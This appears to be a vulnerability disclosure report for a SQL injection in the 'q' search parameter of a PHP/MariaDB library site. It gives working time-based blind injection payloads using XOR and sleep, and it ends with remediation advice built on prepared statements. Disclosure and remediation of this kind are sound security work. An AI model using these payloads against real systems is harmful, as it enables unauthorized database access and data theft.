## Title
SQL Injection – GET Parameter (`q`) in Search Functionality at `library.pwnedbox.site`

## Description
**Affected URL:** https://library.pwnedbox.site/
A SQL Injection vulnerability exists in the `q` GET parameter of the book search functionality at `https://library.pwnedbox.site/index.php`. The search input is directly embedded into a MariaDB `LIKE` query without sanitization, enabling both error-based and time-based blind SQL injection. The error message also partially discloses the underlying query structure, revealing the application uses a `SELECT * FROM` with `LIKE` and `ORDER BY` clauses.

**Affected Parameter:** `q` (GET)  
**Method:** GET  
**Injection Point:** Search bar (book/category search)  
**Backend Database:** MariaDB  
**Server Stack:** LAMPP  
**Vulnerable File:** `/opt/lampp/htdocs/subdomains/library/index.php`

## Steps to Reproduce
1. Navigate to `https://library.pwnedbox.site` and enter any search term in the search bar.
2. Append a single quote to trigger a SQL error:
   ```
   https://library.pwnedbox.site/index.php?q=asdf'
   ```
   → Application returns a fatal SQL error leaking the DB engine, full server path, partial query, and line number.

3. Inject a time-based blind payload via Burp Repeater:
   ```
   GET /index.php?q=1'XOR(94102*if(now()=sysdate(),sleep(5),0))XOR'Z HTTP/2
   Host: library.pwnedbox.site
   ```
   → Response delayed by ~5 seconds, confirming blind SQL injection.

4. Confirm with 10-second sleep via Burp Intruder:
   ```
   q=1'XOR(94102*if(now()=sysdate(),sleep(10),0))XOR'Z
   ```
   → Response time: **10,390 ms** (10-second delay confirmed).

5. Confirm arithmetic execution with multiplied sleep:
   ```
   q='XOR(if(now()=sysdate(),sleep(5*5),0))OR'
   ```
   → Request timed out (25-second sleep confirmed).

## POC (Proof of Concept)
<img width="1918" height="980" alt="a" src="https://github.com/user-attachments/assets/d75e8c41-d260-4510-aef9-3e7313f47ff3" />
<img width="1918" height="978" alt="b" src="https://github.com/user-attachments/assets/68cb0f53-8efb-4a7c-a465-8cbd5d6a1498" />
<img width="1918" height="1012" alt="c" src="https://github.com/user-attachments/assets/ea1c7b35-1da4-4837-8dfd-0db7105f541f" />
<img width="1918" height="1023" alt="d" src="https://github.com/user-attachments/assets/998b5def-9891-4481-9919-735820c7a175" />


## Impact
- **Full Database Exfiltration** – All book records, user data, and credentials can be extracted via blind techniques.
- **Query Structure Disclosed** – Error reveals the `LIKE`/`ORDER BY` query pattern across multiple columns, enabling targeted UNION-based attacks to dump data directly.
- **Inventory Manipulation** – Attacker could modify or delete book/product records (INSERT/UPDATE/DELETE) if stacked queries are supported.
- **Verbose Error Disclosure** – Stack trace exposes internal paths and partial query logic, lowering the bar for further exploitation.

## Remediation
1. **Use Prepared Statements** – Parameterize all queries; never interpolate user input into `LIKE` clauses.
   ```php
   $term = '%' . $_GET['q'] . '%';
   $stmt = $pdo->prepare("SELECT * FROM books WHERE title LIKE ? OR category LIKE ? ORDER BY id ASC");
   $stmt->execute([$term, $term]);
   ```

2. **Validate Input** – Sanitize and limit search input length; reject or strip special SQL characters.

3. **Suppress Error Messages** – Set `display_errors = Off` in `php.ini` to prevent query structure and path leakage in production.

4. **Least Privilege DB User** – Application DB account should only hold `SELECT/INSERT/UPDATE/DELETE` — no `FILE` or admin privileges.
